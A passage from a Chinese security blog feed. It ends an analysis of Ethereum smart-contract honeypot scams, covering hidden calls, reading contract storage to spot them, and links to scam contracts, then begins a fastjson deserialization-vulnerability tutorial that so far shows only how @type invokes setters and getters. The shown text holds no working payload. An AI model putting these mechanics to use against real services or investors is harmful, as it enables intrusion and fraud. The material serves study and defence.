其他地方用require这里用if</li></ul><p>如果这个地方也用require就会导致用于诱惑别人的钓鱼者StartGame调用报错失败，而引起别人怀疑。</p><h2 id="假设是我们"><a href="#假设是我们" class="headerlink" title="假设是我们"></a>假设是我们</h2><p>那么假设我们不知道Etherscan有隐藏调用的情况，是否就肯定会上当受骗呢？</p><p>其实也不是的，因为智能合约的存储空间，我们也是可以读取的。我们可以直接读取智能合约中的变量值（不管是public还是不是public）从而意识到情况不对。</p><p><code>web3.eth.getStorageAt(&quot;0xcEA86636608BaCB632DfD1606A0dC1728b625387&quot;, 0, function(x,y){alert(y)});</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x00000000000000000000000000000000000000000000000000000000000000d1</span> <span class="comment">//string的长度 string question</span></span><br><span class="line"><span class="number">0x0000000000000000000000004b2838d9326bd5126f0573d9b5c71c0626ab28f2</span> <span class="comment">//提问者的地址 address questionSender</span></span><br><span class="line"><span class="number">0x684ff0e88cefc2b7ff23228e02c9a10cc9b5b2e67e12b259a9bca644e19d2b8f</span> <span class="comment">//答案hash bytes32 responseHash</span></span><br><span class="line"><span class="number">0x0000000000000000000000000000000000000000000000000000000000000000</span></span><br></pre></td></tr></table></figure><p>可以发现提问者地址不等于我们所知的调用StartGame钓鱼者的地址</p><p>答案hash也与我们的答案hash不符合</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><ol><li>Etherscan、BTC.com 比特大陆、Tokenview 上仅涉及ETH转账或 Token 转账的交易，Etherscan不会显示不关乎转账的外部合同的调用。</li><li>Etherchain 和 blockchair 可以查看所有调用</li><li>在 Etherscan 查看交易中点击 工具&amp;实用程序 Parity追溯。可以查看交易内部虚拟机层面 智能合约中的调用传递的数据等。（Etherchain中也有这个功能只是包装不到位）</li></ol><h2 id="类似合约"><a href="#类似合约" class="headerlink" title="类似合约"></a>类似合约</h2><p>从2018年3月份至2018年10月份的都有，最长等待鱼儿上钩的时间有100天</p><p>游戏停止，骗币成功：<a href="https://etherscan.io/address/0xce6B1AFf0fE66da643D7A9A64d4747293628D667#code" target="_blank" rel="noopener">https://etherscan.io/address/0xce6B1AFf0fE66da643D7A9A64d4747293628D667#code</a></p><p>游戏停止，骗币成功：<a href="https://etherscan.io/address/0xFf45211eBdfc7EBCC458E584bcEc4EAC19d6A624#code" target="_blank" rel="noopener">https://etherscan.io/address/0xFf45211eBdfc7EBCC458E584bcEc4EAC19d6A624#code</a></p><p>游戏停止，骗币失败: <a href="https://etherscan.io/address/0x4bc53ead2ae82e0c723ee8e3d7bacfb1fafea1ce#code" target="_blank" rel="noopener">https://etherscan.io/address/0x4bc53ead2ae82e0c723ee8e3d7bacfb1fafea1ce#code</a></p><p>游戏停止，骗币失败: <a href="https://etherscan.io/address/0x3B048ab84ddd61C2FfE89EDe66D68ef27661C0f2" target="_blank" rel="noopener">https://etherscan.io/address/0x3B048ab84ddd61C2FfE89EDe66D68ef27661C0f2</a></p><p>游戏停止，骗币失败: <a href="https://etherscan.io/address/0x5ccfcDC1c88134993F48a898AE8E9E35853B2068#code" target="_blank" rel="noopener">https://etherscan.io/address/0x5ccfcDC1c88134993F48a898AE8E9E35853B2068#code</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://medium.com/quantstamp/exploiting-the-interface-of-etherscan-for-ethereum-attacks-17b72d2897e0" target="_blank" rel="noopener">https://medium.com/quantstamp/exploiting-the-interface-of-etherscan-for-ethereum-attacks-17b72d2897e0</a><br><a href="https://paper.seebug.org/671/" target="_blank" rel="noopener">https://paper.seebug.org/671/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;一篇以前写的文，现在修改补充了些许，发了上来&lt;/p&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;智能合约蜜罐相对于互联网蜜罐的目的有着本质的区别：后者着重在于诱导攻击,然后做检
      
    
    </summary>
    
    
      <category term="区块链" scheme="http://lalajun.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
      <category term="以太坊" scheme="http://lalajun.com/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"/>
    
      <category term="智能合约蜜罐" scheme="http://lalajun.com/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E8%9C%9C%E7%BD%90/"/>
    
  </entry>
  
  <entry>
    <title>java反序列化-fastjson</title>
    <link href="http://lalajun.com/2019/12/30/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-fastjson/"/>
    <id>http://lalajun.com/2019/12/30/java反序列化-fastjson/</id>
    <published>2019-12-30T01:05:28.000Z</published>
    <updated>2020-03-25T02:57:47.365Z</updated>
    
    <content type="html"><![CDATA[<p>推荐阅读时间：60min<br>全文字数：14026</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>其实从一开始就是想着学一下fastjson组件的反序列化。结果发现完全理解不能。</p><p>就先一路补了很多其他知识点，RMI反序列化，JNDI注入，7u21链等（就是之前的文章），之后也是拖了很长时间，花了很长时间，总算把这篇一开始就想写的文，给补完了。</p><p>类似的文是已经有了不少，学习也是基于前辈们的文章一步步走来，但是个人习惯于把所有问题理清楚，讲清楚。理应是比大佬们的文要细致些。</p><p>本文需要前置知识：JNDI注入，7u21利用链，可以戳我往期的文章。</p><p>文章内容如下：</p><ol><li>fastjson组件基础介绍及使用（三种反序列化形式等）</li><li>fastjson组件的<strong>@type标识</strong>的特性说明（默认调用setter、getter方法条件等）。</li><li>分析了fastjson组件<strong>1.2.24版本</strong>中JNDI注入利用链与setter参数巧妙完美适配（前置知识参考JNDI注入一文）</li><li>分析了fastjson组件<strong>1.2.24版本</strong>中JDK1.7TemplatesImpl利用链的漏洞触发点poc构造（前置知识参考7u21一文）</li><li>分析了1.2.24-1.2.46版本每个版本迭代中修改代码，修复思路和绕过。（此时由于默认白名单的引入，漏洞危害大降）</li><li>到了1.2.47通杀黑白名单漏洞，因为网上对于这个分析文有点过多。这边想着直接正向来没得意思。尝试从代码审计漏洞挖掘的角度去从零开始挖掘出这一条利用链。最后发现产生了一种我上我也行的错觉（当然实际上只是一种错觉，不可避免受到了已有payload的引导，但是经过分析也算是不会对大佬的0day产生一种畏惧心理，看完也是可以理解的）最后再看了下修复。</li></ol><p>本文实验代码均上传<a href="https://github.com/lalajun/Fastjson_Deserialize" target="_blank" rel="noopener">github</a>，那么想要好好学习的小伙伴请打开idea，配合食用。</p><h2 id="fastjson组件"><a href="#fastjson组件" class="headerlink" title="fastjson组件"></a>fastjson组件</h2><p>fastjson组件是阿里巴巴开发的反序列化与序列化组件，具体细节可以参考<a href="https://github.com/alibaba/fastjson/wiki/Quick-Start-CN" target="_blank" rel="noopener">github文档</a></p><p>组件api使用方法也很简洁<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//序列化</span></span><br><span class="line">String text = JSON.toJSONString(obj); </span><br><span class="line"><span class="comment">//反序列化</span></span><br><span class="line">VO vo = JSON.parse(); <span class="comment">//解析为JSONObject类型或者JSONArray类型</span></span><br><span class="line">VO vo = JSON.parseObject(<span class="string">"&#123;...&#125;"</span>); <span class="comment">//JSON文本解析成JSONObject类型</span></span><br><span class="line">VO vo = JSON.parseObject(<span class="string">"&#123;...&#125;"</span>, VO.class); <span class="comment">//JSON文本解析成VO.class类</span></span><br></pre></td></tr></table></figure></p><p>我们通过demo来使用一下这个组件</p><p>以下使用测试均是基于1.2.24版本的fastjson jar包</p><p>靶机搭建需要存在漏洞的jar包，但是在github上通常会下架存在漏洞的jar包。</p><p>我们可以从<a href="https://mvnrepository.com/artifact/com.alibaba/fastjson/1.2.24" target="_blank" rel="noopener">maven仓库</a>中找到所有版本jar包,方便漏洞复现。</p><h3 id="fastjson组件使用"><a href="#fastjson组件使用" class="headerlink" title="fastjson组件使用"></a>fastjson组件使用</h3><p>先构建需要序列化的User类：<br><code>User.java</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>再使用fastjson组件<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//创建一个用于实验的user类</span></span><br><span class="line">        User user1 = <span class="keyword">new</span> User();</span><br><span class="line">        user1.setName(<span class="string">"lala"</span>);</span><br><span class="line">        user1.setAge(<span class="number">11</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        String serializedStr = JSON.toJSONString(user1);</span><br><span class="line">        System.out.println(<span class="string">"serializedStr="</span>+serializedStr);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过parse方法进行反序列化，返回的是一个JSONObject</span></span><br><span class="line">        Object obj1 = JSON.parse(serializedStr);</span><br><span class="line">        System.out.println(<span class="string">"parse反序列化对象名称:"</span>+obj1.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">"parse反序列化："</span>+obj1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过parseObject,不指定类，返回的是一个JSONObject</span></span><br><span class="line">        Object obj2 = JSON.parseObject(serializedStr);</span><br><span class="line">        System.out.println(<span class="string">"parseObject反序列化对象名称:"</span>+obj2.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">"parseObject反序列化:"</span>+obj2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过parseObject,指定类后返回的是一个相应的类对象</span></span><br><span class="line">        Object obj3 = JSON.parseObject(serializedStr,User.class);</span><br><span class="line">        System.out.println(<span class="string">"parseObject反序列化对象名称:"</span>+obj3.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">"parseObject反序列化:"</span>+obj3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>以上使用了三种形式反序列化<br>结果如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//序列化</span></span><br><span class="line">serializedStr=&#123;<span class="string">"age"</span>:<span class="number">11</span>,<span class="string">"name"</span>:<span class="string">"lala"</span>&#125;</span><br><span class="line"><span class="comment">//parse(&#123;..&#125;)反序列化</span></span><br><span class="line">parse反序列化对象名称:com.alibaba.fastjson.JSONObject</span><br><span class="line">parse反序列化：&#123;<span class="string">"name"</span>:<span class="string">"lala"</span>,<span class="string">"age"</span>:<span class="number">11</span>&#125;</span><br><span class="line"><span class="comment">//parseObject(&#123;..&#125;)反序列化</span></span><br><span class="line">parseObject反序列化对象名称:com.alibaba.fastjson.JSONObject</span><br><span class="line">parseObject反序列化:&#123;<span class="string">"name"</span>:<span class="string">"lala"</span>,<span class="string">"age"</span>:<span class="number">11</span>&#125;</span><br><span class="line"><span class="comment">//parseObject(&#123;&#125;,class)反序列化</span></span><br><span class="line">parseObject反序列化对象名称:com.fastjson.User</span><br><span class="line">parseObject反序列化:com.fastjson.User@<span class="number">3</span>d71d552</span><br></pre></td></tr></table></figure></p><p>parseObject({..})其实就是parse({..})的一个封装，对于parse的结果进行一次结果判定然后转化为JSONOBject类型。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> JSONObject <span class="title">parseObject</span><span class="params">(String text)</span> </span>&#123;</span><br><span class="line">    Object obj = parse(text);</span><br><span class="line">    <span class="keyword">return</span> obj <span class="keyword">instanceof</span> JSONObject ? (JSONObject)obj : (JSONObject)toJSON(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>而parseObject({},class)好像会调用class加载器进行类型转化，但这个细节不是关键，就不研究了</p><p>那么三种反序列化方式除了返回结果之外，还有啥区别？</p><p>在执行过程调用函数上有不同。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjson;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FastJsonTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> String age;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FastJsonTest</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String test)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"name setter called"</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = test;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"name getter called"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getAge</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"age getter called"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Object obj = JSON.parse(<span class="string">"&#123;\"@type\":\"com.fastjson.FastJsonTest\",\"name\":\"thisisname\", \"age\":\"thisisage\"&#125;"</span>);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line"></span><br><span class="line">        Object obj2 = JSON.parseObject(<span class="string">"&#123;\"@type\":\"com.fastjson.FastJsonTest\",\"name\":\"thisisname\", \"age\":\"thisisage\"&#125;"</span>);</span><br><span class="line">        System.out.println(obj2);</span><br><span class="line"></span><br><span class="line">        Object obj3 = JSON.parseObject(<span class="string">"&#123;\"@type\":\"com.fastjson.FastJsonTest\",\"name\":\"thisisname\", \"age\":\"thisisage\"&#125;"</span>,FastJsonTest.class);</span><br><span class="line">        System.out.println(obj3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>结果如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//JSON.parse("")</span></span><br><span class="line">name setter called</span><br><span class="line">com.fastjson.FastJsonTest@<span class="number">5</span>a2e4553</span><br><span class="line"><span class="comment">//JSON.parseObject("")</span></span><br><span class="line">name setter called</span><br><span class="line">age getter called</span><br><span class="line">name getter called</span><br><span class="line">&#123;<span class="string">"name"</span>:<span class="string">"thisisname"</span>,<span class="string">"age"</span>:<span class="string">"thisisage"</span>&#125;</span><br><span class="line"><span class="comment">//JSON.parseObject("",class)</span></span><br><span class="line">name setter called</span><br><span class="line">com.fastjson.FastJsonTest<span class="meta">@e</span>2144e4</span><br></pre></td></tr></table></figure></p><p>结论：</p><ul><li>parse(“”) 会识别并调用目标类的特定 setter 方法及某些特定条件的 getter 方法</li><li>parseObject(“”) 会调用反序列化目标类的特定 setter 和 getter 方法（此处有的博客说是所有setter，个人测试返回String的setter是不行的，此处打个问号）</li><li>parseObject(“”,class) 会识别并调用目标类的特定 setter 方法及某些特定条件的 getter 方法</li></ul><p>特定的setter和getter的调用都是在解析过程中的调用。（具体是哪些setter和getter会被调用，我们将在之后讲到）</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae284qq65j31tz122wl9.jpg" alt="setter解析中执行.png"></p><p>之所以<strong>parseObject(“”)</strong>有区别就是因为<strong>parseObject(“”)</strong>比起其他方式多了一步<strong>toJSON</strong>操作，在这一步中会对所有getter进行调用。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae27y570pj31va0ylted.jpg" alt="getter全调用.png"></p><h3 id="type"><a href="#type" class="headerlink" title="@type"></a>@type</h3><p>那么除开正常的序列化，反序列化。<br>fastjson提供特殊字符段<code>@type</code>，这个字段可以指定反序列化任意类，并且会自动调用类中属性的特定的set，get方法。</p><p>我们先来看一下这个字段的使用:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//@使用特定修饰符，写入@type序列化</span></span><br><span class="line">String serializedStr1 = JSON.toJSONString(user1,SerializerFeature.WriteClassName);</span><br><span class="line">System.out.println(<span class="string">"serializedStr1="</span>+serializedStr1);</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过parse方法进行反序列化</span></span><br><span class="line">Object obj4 = JSON.parse(serializedStr1);</span><br><span class="line">System.out.println(<span class="string">"parse反序列化对象名称:"</span>+obj4.getClass().getName());</span><br><span class="line">System.out.println(<span class="string">"parseObject反序列化:"</span>+obj4);</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过这种方式返回的是一个相应的类对象</span></span><br><span class="line">Object obj5 = JSON.parseObject(serializedStr1);</span><br><span class="line">System.out.println(<span class="string">"parseObject反序列化对象名称:"</span>+obj5.getClass().getName());</span><br><span class="line">System.out.println(<span class="string">"parseObject反序列化:"</span>+obj5);</span><br></pre></td></tr></table></figure></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//序列化</span></span><br><span class="line">serializedStr1=&#123;<span class="string">"@type"</span>:<span class="string">"com.fastjson.User"</span>,<span class="string">"age"</span>:<span class="number">11</span>,<span class="string">"name"</span>:<span class="string">"lala"</span>&#125;</span><br><span class="line"><span class="comment">//parse反序列化</span></span><br><span class="line">parse反序列化对象名称:com.fastjson.User</span><br><span class="line">parseObject反序列化:com.fastjson.User@<span class="number">1</span>cf4f579</span><br><span class="line"><span class="comment">//parseObject反序列化</span></span><br><span class="line">parseObject反序列化对象名称:com.alibaba.fastjson.JSONObject</span><br><span class="line">parseObject反序列化:&#123;<span class="string">"name"</span>:<span class="string">"lala"</span>,<span class="string">"age"</span>:<span class="number">11</span>&#125;</span><br></pre></td></tr></table></figure><p>这边在调试的时候，可以看到，本该解析出来的@type都没有解析出来</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae27qrizoj30qk07yglz.jpg" alt="@type反序列化.png"></p><p>以上我们可以知道当@type输入的时候会特殊解析（不然的话会有@type：com.fastjson.User的键值对），那么自动调用其特定的set，get方法怎么说呢？</p><p>我们先建立一个序列化实验用的Person类</p><p><code>Person.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="comment">//属性</span></span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String full_name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> Boolean sex;</span><br><span class="line">    <span class="keyword">private</span> Properties prop;</span><br><span class="line"><span class="comment">//构造函数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Person构造函数"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//set</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"setAge()"</span>);</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//get 返回Boolean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Boolean <span class="title">getSex</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getSex()"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.sex;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//get 返回ProPerties</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Properties <span class="title">getProp</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getProp()"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.prop;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//在输出时会自动调用的对象ToString函数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String s = <span class="string">"[Person Object] name="</span> + <span class="keyword">this</span>.name + <span class="string">" full_name="</span> + <span class="keyword">this</span>.full_name  + <span class="string">", age="</span> + <span class="keyword">this</span>.age + <span class="string">", prop="</span> + <span class="keyword">this</span>.prop + <span class="string">", sex="</span> + <span class="keyword">this</span>.sex;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>@type反序列化实验：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">type</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String eneity3 = <span class="string">"&#123;\"@type\":\"com.fastjson.Person\", \"name\":\"lala\", \"full_name\":\"lalalolo\", \"age\": 13, \"prop\": &#123;\"123\":123&#125;, \"sex\": 1&#125;"</span>;</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        Object obj = JSON.parseObject(eneity3,Person.class);</span><br><span class="line">        <span class="comment">//输出会调用obj对象的tooString函数</span></span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Person构造函数</span><br><span class="line">setAge()</span><br><span class="line">getProp()</span><br><span class="line">[Person Object] name=lala full_name=null, age=13, prop=null, sex=null</span><br><span class="line"></span><br><span class="line">public name 反序列化成功</span><br><span class="line">private full_name 反序列化失败</span><br><span class="line">private age setAge函数被调用</span><br><span class="line">private sex getsex函数没有被调用</span><br><span class="line">private prop 